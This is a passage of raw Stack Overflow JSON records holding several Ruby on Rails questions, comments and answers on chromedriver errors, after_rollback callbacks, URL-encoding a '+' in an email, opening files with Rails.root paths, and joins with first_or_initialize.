{"reputation": 42014, "user_id": 2709090, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/238c2b7cde2c817fc9a5a2b8eaa2ffad?s=128&d=identicon&r=PG&f=1", "display_name": "Thomas Walpole", "link": "https://stackoverflow.com/users/2709090/thomas-walpole"}, "edited": false, "score": 0, "creation_date": 1558371382, "post_id": 56220898, "comment_id": 99071038, "body": "They should get picked up if no version is specified (and no other gem you&#39;re using specifies a dependency version requirement). Check your gemfile.lock for references to <code>webdrivers</code> to see what else (if anything) specifies it as a requirement."}], "owner": {"reputation": 84135, "user_id": 631619, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/b6f3159af5195eddff62a2dd4f9ad969?s=128&d=identicon&r=PG", "display_name": "Michael Durrant", "link": "https://stackoverflow.com/users/631619/michael-durrant"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 90, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1558355369, "creation_date": 1558354833, "last_edit_date": 1558355369, "question_id": 56220898, "link": "https://stackoverflow.com/questions/56220898/why-is-chromedriver-failing-with-ruby-2-4-0-and-bundler-2-0-1-with-undefined-met", "title": "Why is chromedriver failing with ruby 2.4.0 and bundler 2.0.1 with undefined method `[]&#39; for nil:NilClass (NoMethodError)", "body": "<p>i am trying to run my ruby app which uses capybara.\nIt worked on another machine but when I switched machine and installed ruby and bundled and ran it on the new machine I got:</p>\n\n<pre><code>me/service.rb:115:in\n`connect_until_stable': unable to connect to chromedriver 127.0.0.1:9515 (Selenium::WebDriver\n::Error::WebDriverError)```   \n\nTrying to look at the version of chrommedriver gives me this:\n\n    chromedriver -v\n\n/home/michael/.rbenv/versions/2.4.0/lib/ruby/gems/2.4.0/gems/nokogiri-1.6.8/lib/nokogiri/xml/document.rb:44: warning: constant ::Fixnum is deprecated\n/home/michael/.rbenv/versions/2.4.0/lib/ruby/gems/2.4.0/gems/webdrivers-2.4.0/lib/webdrivers/chromedriver.rb:19:in `block in newest_version': undefined method `[]' for nil:NilClass (NoMethodError)```\n\nError seems to be:\n\n    chromedriver.rb:19:in `block in newest_version': undefined method `[]' for nil:NilClass (NoMethodError)\n\nI also get:\n\n$ sudo apt-get install chromedriver\nReading package lists... Done\nBuilding dependency tree       \nReading state information... Done\nPackage chromedriver is not available, but is referred to by another package.\nThis may mean that the package is missing, has been obsoleted, or\nis only available from another source\n\nE: Package 'chromedriver' has no installation candidate\n\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "transactions"], "answers": [{"comments": [{"owner": {"reputation": 2575, "user_id": 891359, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4926014a83c1d25207953e5e585556cb?s=128&d=identicon&r=PG", "display_name": "bo-oz", "link": "https://stackoverflow.com/users/891359/bo-oz"}, "reply_to_user": {"reputation": 653, "user_id": 7297310, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/2Ofj2.jpg?s=128&g=1", "display_name": "aravvn", "link": "https://stackoverflow.com/users/7297310/aravvn"}, "edited": false, "score": 0, "creation_date": 1558353274, "post_id": 56219796, "comment_id": 99061336, "body": "oh, I see I added some comma&#39;s, try again with updated code."}, {"owner": {"reputation": 653, "user_id": 7297310, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/2Ofj2.jpg?s=128&g=1", "display_name": "aravvn", "link": "https://stackoverflow.com/users/7297310/aravvn"}, "edited": false, "score": 0, "creation_date": 1558357469, "post_id": 56219796, "comment_id": 99063606, "body": "didn&#39;t make change. I don&#39;t think it&#39;s about syntax cause I don&#39;t get any errors but validation or database, it just won&#39;t trigger callback when I add the on: :create param."}], "tags": [], "owner": {"reputation": 2575, "user_id": 891359, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4926014a83c1d25207953e5e585556cb?s=128&d=identicon&r=PG", "display_name": "bo-oz", "link": "https://stackoverflow.com/users/891359/bo-oz"}, "is_accepted": false, "score": 1, "last_activity_date": 1558353279, "last_edit_date": 1558353279, "creation_date": 1558350720, "answer_id": 56219796, "question_id": 56219497, "link": "https://stackoverflow.com/questions/56219497/after-rollback-on-create-not-triggered/56219796#56219796", "title": "after_rollback on :create not triggered", "body": "<p>I think you have to define it differently...</p>\n\n<pre><code>  after_commit :after_commit_action, on: :create\n\n  after_rollback :after_rollback_action, on: :create\n\n  def after_commit_action\n    # do your magic\n  end\n\n  def after_rollback_action\n    # do your magic\n  end\n</code></pre>\n"}], "owner": {"reputation": 653, "user_id": 7297310, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/2Ofj2.jpg?s=128&g=1", "display_name": "aravvn", "link": "https://stackoverflow.com/users/7297310/aravvn"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 173, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1558353279, "creation_date": 1558349763, "last_edit_date": 1558351552, "question_id": 56219497, "link": "https://stackoverflow.com/questions/56219497/after-rollback-on-create-not-triggered", "title": "after_rollback on :create not triggered", "body": "<p>I have a <code>product</code> table and  I try to run after_commit and after_rollback on create.</p>\n\n<p>controller:</p>\n\n<pre><code>  product = Product.new form_params\n  if product.save\n    ...\n  else\n    ...\n  end\n</code></pre>\n\n<p>model:</p>\n\n<pre><code>  after_commit(on: :create) {\n    ...\n  }\n\n  after_rollback(on: :create) {\n    ...\n  }\n</code></pre>\n\n<p>after_commit works well but after_rollback wont work with <code>on: :create</code> param. When I remove the <code>on: :create</code> param, it triggers too but I need after_rollback to trigger just on create.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "encoding", "urlencode"], "comments": [{"owner": {"reputation": 2575, "user_id": 891359, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4926014a83c1d25207953e5e585556cb?s=128&d=identicon&r=PG", "display_name": "bo-oz", "link": "https://stackoverflow.com/users/891359/bo-oz"}, "edited": false, "score": 0, "creation_date": 1558351031, "post_id": 56218696, "comment_id": 99060094, "body": "You probably should be wondering yourself why you&#39;d like to pass a e-mail in the URL params... this is commonly bad practice."}, {"owner": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "edited": false, "score": 2, "creation_date": 1558352885, "post_id": 56218696, "comment_id": 99061110, "body": "Why do you want to encode the <code>+</code> in the URL but not the <code>@</code>? <code>@</code> must be encoded too."}, {"owner": {"reputation": 90, "user_id": 7433847, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7df3e06319b58bed8fa82841b2195cac?s=128&d=identicon&r=PG&f=1", "display_name": "kirti", "link": "https://stackoverflow.com/users/7433847/kirti"}, "edited": false, "score": 0, "creation_date": 1558414425, "post_id": 56218696, "comment_id": 99081964, "body": "yes I know it should be encoded, but this requirement is this only."}], "answers": [{"comments": [{"owner": {"reputation": 30655, "user_id": 138557, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/73c04e9ef9ca435c5b19a2e765ae6d20?s=128&d=identicon&r=PG", "display_name": "Max Williams", "link": "https://stackoverflow.com/users/138557/max-williams"}, "edited": false, "score": 0, "creation_date": 1558365284, "post_id": 56220412, "comment_id": 99068229, "body": "I&#39;ve had to do this when building params for an OAuth (v1) API.  So the answer is &quot;to fit other people&#39;s dumb expectations&quot;.  I didn&#39;t know about this way of using <code>URI.escape</code> with the extra argument though, that&#39;s handy."}, {"owner": {"reputation": 13442, "user_id": 3982562, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2a3c7aae1d762372cda697833c602ec8?s=128&d=identicon&r=PG", "display_name": "3limin4t0r", "link": "https://stackoverflow.com/users/3982562/3limin4t0r"}, "reply_to_user": {"reputation": 30655, "user_id": 138557, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/73c04e9ef9ca435c5b19a2e765ae6d20?s=128&d=identicon&r=PG", "display_name": "Max Williams", "link": "https://stackoverflow.com/users/138557/max-williams"}, "edited": false, "score": 1, "creation_date": 1558367844, "post_id": 56220412, "comment_id": 99069593, "body": "Keep in mind that the answer is currently <b>only escaping the <code>+</code> character</b>, and no other characters. If you want to escape other characters like <code>?</code>, <code>%</code>, etc you&#39;ll have to include them in the second argument as well."}, {"owner": {"reputation": 30655, "user_id": 138557, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/73c04e9ef9ca435c5b19a2e765ae6d20?s=128&d=identicon&r=PG", "display_name": "Max Williams", "link": "https://stackoverflow.com/users/138557/max-williams"}, "edited": false, "score": 0, "creation_date": 1558512663, "post_id": 56220412, "comment_id": 99121706, "body": "Ah, so the inconsistency with space is kind of part of the system then.  thanks"}], "tags": [], "owner": {"reputation": 13442, "user_id": 3982562, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2a3c7aae1d762372cda697833c602ec8?s=128&d=identicon&r=PG", "display_name": "3limin4t0r", "link": "https://stackoverflow.com/users/3982562/3limin4t0r"}, "is_accepted": true, "score": 1, "last_activity_date": 1558357614, "last_edit_date": 1558357614, "creation_date": 1558352858, "answer_id": 56220412, "question_id": 56218696, "link": "https://stackoverflow.com/questions/56218696/how-to-encode-email-if-it-contains-to-2b-in-ruby/56220412#56220412", "title": "How to encode Email if it contains &quot;+&quot; to %2B in Ruby", "body": "<p>The <code>uri</code> std-lib has a method for that <a href=\"http://ruby-doc.org/stdlib-2.6.3/libdoc/uri/rdoc/URI/Escape.html#method-i-escape\" rel=\"nofollow noreferrer\"><code>URI::Escape#escape</code></a>. <code>URI</code> extends the <code>URI::Escape</code> module, so also has this method.</p>\n\n<pre><code>URI.escape('test+@gmail.com', '+')\n#=&gt; \"test%2B@gmail.com\"        ^ the characters to escape with URL encoding\n</code></pre>\n\n<p>However like <a href=\"https://stackoverflow.com/questions/56218696/how-to-encode-email-if-it-contains-to-2b-in-ruby#comment99061110_56218696\">@spickermann says in the comments</a>: </p>\n\n<blockquote>\n  <p>Why do you want to encode the <code>+</code> in the URL but not the <code>@</code>? <code>@</code> must be encoded too.</p>\n</blockquote>\n"}], "owner": {"reputation": 90, "user_id": 7433847, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7df3e06319b58bed8fa82841b2195cac?s=128&d=identicon&r=PG&f=1", "display_name": "kirti", "link": "https://stackoverflow.com/users/7433847/kirti"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 438, "favorite_count": 0, "accepted_answer_id": 56220412, "answer_count": 1, "score": 1, "last_activity_date": 1558357614, "creation_date": 1558346974, "last_edit_date": 1558347976, "question_id": 56218696, "link": "https://stackoverflow.com/questions/56218696/how-to-encode-email-if-it-contains-to-2b-in-ruby", "title": "How to encode Email if it contains &quot;+&quot; to %2B in Ruby", "body": "<p>How to encode URL parameters with UTF8 encoding:\nURL?email=test+@gmail.com to URL?email=test%2B@gmail.com</p>\n\n<p>I tried 'test+@gmail.com'.encode(\"UTF-8\")</p>\n\n<p>CGI::escape('test+@gmail.com') it returns 'test%2B%40gmail.com But i need test%2B@gmail.com</p>\n\n<p>email=test+@gmail.com should encode to \"+\"only rest remain same\nURL?email=test%2B@gmail.com</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "ruby-on-rails-3", "ruby-on-rails-4"], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 11438387, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7df0b3c95bbf2525fcc58e5f37adcc8?s=128&d=identicon&r=PG&f=1", "display_name": "alie", "link": "https://stackoverflow.com/users/11438387/alie"}, "edited": false, "score": 0, "creation_date": 1558346033, "post_id": 56218233, "comment_id": 99057373, "body": "hi thanks for the answering, now it returns No such file or directory @ rb_sysopen"}, {"owner": {"reputation": 27144, "user_id": 3857758, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/58c4295826435f049b7fc32b98c240f9?s=128&d=identicon&r=PG&f=1", "display_name": "Ursus", "link": "https://stackoverflow.com/users/3857758/ursus"}, "reply_to_user": {"reputation": 11, "user_id": 11438387, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7df0b3c95bbf2525fcc58e5f37adcc8?s=128&d=identicon&r=PG&f=1", "display_name": "alie", "link": "https://stackoverflow.com/users/11438387/alie"}, "edited": false, "score": 0, "creation_date": 1558346078, "post_id": 56218233, "comment_id": 99057389, "body": "So that file does not exist :) check the pathname"}, {"owner": {"reputation": 11, "user_id": 11438387, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7df0b3c95bbf2525fcc58e5f37adcc8?s=128&d=identicon&r=PG&f=1", "display_name": "alie", "link": "https://stackoverflow.com/users/11438387/alie"}, "edited": false, "score": 0, "creation_date": 1558347984, "post_id": 56218233, "comment_id": 99058377, "body": "hi Do you mean this as pathname ?file = File.join(Rails.root, &#39;app&#39; &#39;models&#39;,&#39;assets&#39;, &#39;files&#39;, &#39;test_list.txt&#39;)"}, {"owner": {"reputation": 27144, "user_id": 3857758, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/58c4295826435f049b7fc32b98c240f9?s=128&d=identicon&r=PG&f=1", "display_name": "Ursus", "link": "https://stackoverflow.com/users/3857758/ursus"}, "reply_to_user": {"reputation": 11, "user_id": 11438387, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7df0b3c95bbf2525fcc58e5f37adcc8?s=128&d=identicon&r=PG&f=1", "display_name": "alie", "link": "https://stackoverflow.com/users/11438387/alie"}, "edited": false, "score": 0, "creation_date": 1558348331, "post_id": 56218233, "comment_id": 99058573, "body": "yes, if you get that error it means this file does not exist"}, {"owner": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "reply_to_user": {"reputation": 11, "user_id": 11438387, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7df0b3c95bbf2525fcc58e5f37adcc8?s=128&d=identicon&r=PG&f=1", "display_name": "alie", "link": "https://stackoverflow.com/users/11438387/alie"}, "edited": false, "score": 1, "creation_date": 1558360528, "post_id": 56218233, "comment_id": 99065427, "body": "@alie also that looks like a very stange path to a file &quot;.../app/models/assets/files/...&quot; are you sure <code>models</code> belongs in that path?"}, {"owner": {"reputation": 11, "user_id": 11438387, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7df0b3c95bbf2525fcc58e5f37adcc8?s=128&d=identicon&r=PG&f=1", "display_name": "alie", "link": "https://stackoverflow.com/users/11438387/alie"}, "reply_to_user": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "edited": false, "score": 0, "creation_date": 1558368610, "post_id": 56218233, "comment_id": 99069906, "body": "hi @engineersmnky do you this line here file = File.join(Rails.root, &#39;app&#39; &#39;models&#39;,&#39;assets&#39;, &#39;files&#39;, &#39;test_list.txt&#39;) ??"}, {"owner": {"reputation": 11, "user_id": 11438387, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7df0b3c95bbf2525fcc58e5f37adcc8?s=128&d=identicon&r=PG&f=1", "display_name": "alie", "link": "https://stackoverflow.com/users/11438387/alie"}, "edited": false, "score": 0, "creation_date": 1558368645, "post_id": 56218233, "comment_id": 99069919, "body": "yeah i am pretty sure thaat&#39;s not right, i am tring to call it from the controller, how sould I write it?"}, {"owner": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "reply_to_user": {"reputation": 11, "user_id": 11438387, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7df0b3c95bbf2525fcc58e5f37adcc8?s=128&d=identicon&r=PG&f=1", "display_name": "alie", "link": "https://stackoverflow.com/users/11438387/alie"}, "edited": false, "score": 0, "creation_date": 1558372130, "post_id": 56218233, "comment_id": 99071336, "body": "@alie where is the actual file located? If I had to guess you are looking for <code>Rails.root.join(&#39;app&#39;,&#39;assets&#39;,&#39;files&#39;,&#39;test_list.txt&#39;)</code> or <code>Rails.root.join(&#39;lib&#39;,&#39;assets&#39;,&#39;files&#39;,&#39;test_list.txt&#39;)</code>"}], "tags": [], "owner": {"reputation": 27144, "user_id": 3857758, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/58c4295826435f049b7fc32b98c240f9?s=128&d=identicon&r=PG&f=1", "display_name": "Ursus", "link": "https://stackoverflow.com/users/3857758/ursus"}, "is_accepted": false, "score": 0, "last_activity_date": 1558345720, "last_edit_date": 1558345720, "creation_date": 1558345362, "answer_id": 56218233, "question_id": 56218141, "link": "https://stackoverflow.com/questions/56218141/how-to-open-a-file-with-with-ruby/56218233#56218233", "title": "How to open a file with with ruby?", "body": "<p>You're passing nothing to the <code>open</code> method. Pass the filename</p>\n\n<p>Change</p>\n\n<pre><code>File.open\n</code></pre>\n\n<p>to</p>\n\n<pre><code>File.open(file)\n</code></pre>\n\n<p><code>open</code> method needs to know at least the filename it has to open</p>\n"}, {"tags": [], "owner": {"reputation": 348, "user_id": 3951881, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/Xd0GY.jpg?s=128&g=1", "display_name": "Avijit Majhi", "link": "https://stackoverflow.com/users/3951881/avijit-majhi"}, "is_accepted": false, "score": 0, "last_activity_date": 1559059625, "creation_date": 1559059625, "answer_id": 56346223, "question_id": 56218141, "link": "https://stackoverflow.com/questions/56218141/how-to-open-a-file-with-with-ruby/56346223#56346223", "title": "How to open a file with with ruby?", "body": "<p>I think you missed a comma.You can write the below code.</p>\n\n<p><code>file = File.join(Rails.root, 'app', 'models','assets', 'files', 'test_list.txt')</code></p>\n\n<p>and for reading the content</p>\n\n<pre><code>File.read(file) do |file|\n  file.each do |line|\n    p line\n  end\nend\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 11438387, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7df0b3c95bbf2525fcc58e5f37adcc8?s=128&d=identicon&r=PG&f=1", "display_name": "alie", "link": "https://stackoverflow.com/users/11438387/alie"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 357, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1559059625, "creation_date": 1558345037, "last_edit_date": 1558351998, "question_id": 56218141, "link": "https://stackoverflow.com/questions/56218141/how-to-open-a-file-with-with-ruby", "title": "How to open a file with with ruby?", "body": "<p>I am trying to open a file on rails user model with ruby and call it from user controller but it kept throwing me back wrong number of arguments (given 0, expected 1..3).</p>\n\n<p>This is my file directory 'app' ,'assets', 'files', 'test_list.txt'\n'app' ,'controllers', 'users controller'</p>\n\n<p>can you help?thanks</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>class User &lt; ApplicationRecord\n  def self.my_method\n    my_array = []\n\n    file = File.join(Rails.root, 'app' 'models','assets', 'files', 'test_list.txt')\n    File.open.each do |line|\n      my_array &lt;&lt; line.gsub!(/\\n?/, \"\")\n    end\n\n    return my_array.to_s\n  end\nend\n</code></pre>\n\n<pre><code>class UsersController &lt; ApplicationController\n  require 'open-uri'\n  require 'net/http'\n\n  def show\n    # uri = URI('https://gist.githubusercontent.com/Kalagan/3b26be21cbf65b62cf05ab549433314e/raw')\n    #   data = Net::HTTP.get(uri)\n    #   anagrams = data.split(/\\n/)\n\n    @vari = User.my_method\n    @query = params[:query]\n    @results = anagrams.select { |word| @query.split('').sort.join == word.split('').sort.join }\n  end\nend\n\n\n\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "join", "inner-join"], "comments": [{"owner": {"reputation": 7856, "user_id": 79068, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/FNeR0.png?s=128&g=1", "display_name": "Ben Hull", "link": "https://stackoverflow.com/users/79068/ben-hull"}, "edited": false, "score": 0, "creation_date": 1558345404, "post_id": 56217535, "comment_id": 99056992, "body": "Which version of Rails are you using?"}, {"owner": {"reputation": 7856, "user_id": 79068, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/FNeR0.png?s=128&g=1", "display_name": "Ben Hull", "link": "https://stackoverflow.com/users/79068/ben-hull"}, "edited": false, "score": 0, "creation_date": 1558345774, "post_id": 56217535, "comment_id": 99057221, "body": "Also, this may just be your example code and not the actual problem, but you have <code>user: </code> in  your first example and <code>users:</code> in your second. If Attendance <code>belongs_to</code> User, this doesn&#39;t seem correct."}, {"owner": {"reputation": 848, "user_id": 11249670, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f29532e75e13b5f3b631012229f22829?s=128&d=identicon&r=PG&f=1", "display_name": "reesaspieces", "link": "https://stackoverflow.com/users/11249670/reesaspieces"}, "reply_to_user": {"reputation": 7856, "user_id": 79068, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/FNeR0.png?s=128&g=1", "display_name": "Ben Hull", "link": "https://stackoverflow.com/users/79068/ben-hull"}, "edited": false, "score": 0, "creation_date": 1558346717, "post_id": 56217535, "comment_id": 99057723, "body": "I\u2019m using 2.6.2. Let me check your other point later, thanks for the comment!"}, {"owner": {"reputation": 7856, "user_id": 79068, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/FNeR0.png?s=128&g=1", "display_name": "Ben Hull", "link": "https://stackoverflow.com/users/79068/ben-hull"}, "edited": false, "score": 0, "creation_date": 1558346978, "post_id": 56217535, "comment_id": 99057846, "body": "Do you mean Ruby 2.6.2 (current) or Rails 2.6.2 (very ancient)?"}, {"owner": {"reputation": 848, "user_id": 11249670, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f29532e75e13b5f3b631012229f22829?s=128&d=identicon&r=PG&f=1", "display_name": "reesaspieces", "link": "https://stackoverflow.com/users/11249670/reesaspieces"}, "reply_to_user": {"reputation": 7856, "user_id": 79068, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/FNeR0.png?s=128&g=1", "display_name": "Ben Hull", "link": "https://stackoverflow.com/users/79068/ben-hull"}, "edited": false, "score": 0, "creation_date": 1558353740, "post_id": 56217535, "comment_id": 99061584, "body": "@Beejamin Sorry, I somehow misread your comment earlier! I\u2019m using Ruby 2.6.2 and Rails 5.2.3."}], "answers": [{"comments": [{"owner": {"reputation": 848, "user_id": 11249670, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f29532e75e13b5f3b631012229f22829?s=128&d=identicon&r=PG&f=1", "display_name": "reesaspieces", "link": "https://stackoverflow.com/users/11249670/reesaspieces"}, "edited": false, "score": 0, "creation_date": 1558403606, "post_id": 56222507, "comment_id": 99080012, "body": "You&#39;re right - if I run my test with <code>byebug</code> under the <code>.first_or_initialize</code> line and inspect the content, any reference to user Bob is gone. <code>#&lt;Attendance id: nil, user_id: nil, date: &quot;2019-05-21&quot;, ... (other columns)&gt;</code> This seems odd to me because the <code>date</code> value has been set as it&#39;s supposed to. What causes this difference in behavior? Is it because I used the join query when specifying the user?"}, {"owner": {"reputation": 848, "user_id": 11249670, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f29532e75e13b5f3b631012229f22829?s=128&d=identicon&r=PG&f=1", "display_name": "reesaspieces", "link": "https://stackoverflow.com/users/11249670/reesaspieces"}, "edited": false, "score": 0, "creation_date": 1558404951, "post_id": 56222507, "comment_id": 99080227, "body": "(In response to your first question: no, I wasn&#39;t setting Bob&#39;s ID in the <code>update</code> call.)"}, {"owner": {"reputation": 2575, "user_id": 891359, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4926014a83c1d25207953e5e585556cb?s=128&d=identicon&r=PG", "display_name": "bo-oz", "link": "https://stackoverflow.com/users/891359/bo-oz"}, "reply_to_user": {"reputation": 848, "user_id": 11249670, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f29532e75e13b5f3b631012229f22829?s=128&d=identicon&r=PG&f=1", "display_name": "reesaspieces", "link": "https://stackoverflow.com/users/11249670/reesaspieces"}, "edited": false, "score": 0, "creation_date": 1558409345, "post_id": 56222507, "comment_id": 99080956, "body": "Basically what happens is that after the where returns an empty set, you are initializing, which is basically the same as running Model.new. So that\u2019s why you lost the context of Bob and need to reassign. Which shouldn\u2019t be a problem right? So it boils down to a matter of taste I guess, the find_or_create_by versus the double fetching of Bob. I think I personally like the first approach better."}, {"owner": {"reputation": 848, "user_id": 11249670, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f29532e75e13b5f3b631012229f22829?s=128&d=identicon&r=PG&f=1", "display_name": "reesaspieces", "link": "https://stackoverflow.com/users/11249670/reesaspieces"}, "edited": false, "score": 0, "creation_date": 1558411004, "post_id": 56222507, "comment_id": 99081243, "body": "I don&#39;t think my question was clear, so let me rephrase - you said the query returns an empty set, but in truth, the <code>date</code> column is filled while the <code>user</code> comes back empty (so the created record is only partially empty). What is the cause for the difference in behavior between <code>date</code> and <code>user</code>?"}, {"owner": {"reputation": 848, "user_id": 11249670, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f29532e75e13b5f3b631012229f22829?s=128&d=identicon&r=PG&f=1", "display_name": "reesaspieces", "link": "https://stackoverflow.com/users/11249670/reesaspieces"}, "edited": false, "score": 0, "creation_date": 1558411078, "post_id": 56222507, "comment_id": 99081252, "body": "And I agree, I think I will ultimately go with the first approach. Just trying to learn about the different behavior for future reference :)"}, {"owner": {"reputation": 2575, "user_id": 891359, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4926014a83c1d25207953e5e585556cb?s=128&d=identicon&r=PG", "display_name": "bo-oz", "link": "https://stackoverflow.com/users/891359/bo-oz"}, "reply_to_user": {"reputation": 848, "user_id": 11249670, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f29532e75e13b5f3b631012229f22829?s=128&d=identicon&r=PG&f=1", "display_name": "reesaspieces", "link": "https://stackoverflow.com/users/11249670/reesaspieces"}, "edited": false, "score": 0, "creation_date": 1558422201, "post_id": 56222507, "comment_id": 99084696, "body": "What happens when you put \u2018user\u2019 instead of \u2018users\u2019 in the where clause?"}, {"owner": {"reputation": 848, "user_id": 11249670, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f29532e75e13b5f3b631012229f22829?s=128&d=identicon&r=PG&f=1", "display_name": "reesaspieces", "link": "https://stackoverflow.com/users/11249670/reesaspieces"}, "edited": false, "score": 0, "creation_date": 1558423561, "post_id": 56222507, "comment_id": 99085300, "body": "That returns this error: <code>ActiveRecord::StatementInvalid: PG::UndefinedTable: ERROR:  missing FROM-clause entry for table &quot;user&quot;</code> (I&#39;m using PostgreSQL). I think this part has to be plural even if you&#39;re retrieving one user, judging from the example in the <a href=\"https://guides.rubyonrails.org/active_record_querying.html#specifying-conditions-on-the-joined-tables\" rel=\"nofollow noreferrer\">docs</a>:  <code>Client.joins(:orders).where(orders: { created_at: time_range })</code>"}, {"owner": {"reputation": 2575, "user_id": 891359, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4926014a83c1d25207953e5e585556cb?s=128&d=identicon&r=PG", "display_name": "bo-oz", "link": "https://stackoverflow.com/users/891359/bo-oz"}, "reply_to_user": {"reputation": 848, "user_id": 11249670, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f29532e75e13b5f3b631012229f22829?s=128&d=identicon&r=PG&f=1", "display_name": "reesaspieces", "link": "https://stackoverflow.com/users/11249670/reesaspieces"}, "edited": false, "score": 0, "creation_date": 1558445536, "post_id": 56222507, "comment_id": 99097624, "body": "I think that the problem lies there, since you could join multiple users, so rails is unaware of which user to set in the new object."}, {"owner": {"reputation": 848, "user_id": 11249670, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f29532e75e13b5f3b631012229f22829?s=128&d=identicon&r=PG&f=1", "display_name": "reesaspieces", "link": "https://stackoverflow.com/users/11249670/reesaspieces"}, "edited": false, "score": 0, "creation_date": 1558486051, "post_id": 56222507, "comment_id": 99114093, "body": "Possible... but then that raises the question I raised in my original post; cases where the record only needs to be updated (not initialized) are fine. For example, if I tried to update some column of an already-existing attendance record, like this, it works: <code>Attendance.joins(:user).where(users: {name: &#39;Bob&#39;}, date: Time.zone.today).first_or_initialize.update(some_column: some_value)</code>"}], "tags": [], "owner": {"reputation": 2575, "user_id": 891359, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4926014a83c1d25207953e5e585556cb?s=128&d=identicon&r=PG", "display_name": "bo-oz", "link": "https://stackoverflow.com/users/891359/bo-oz"}, "is_accepted": false, "score": -1, "last_activity_date": 1558360738, "creation_date": 1558360738, "answer_id": 56222507, "question_id": 56217535, "link": "https://stackoverflow.com/questions/56217535/how-to-use-the-joins-method-with-first-or-initialize-instead-of-find-or-initiali/56222507#56222507", "title": "How to use the joins method with first_or_initialize instead of find_or_initialize_by (Rails)?", "body": "<p>Are you setting Bob's ID in the update call? Basically when you run this, and the where clause returns empty, an empty new record is instantiated. At this moment, all reference to Bob is gone, so 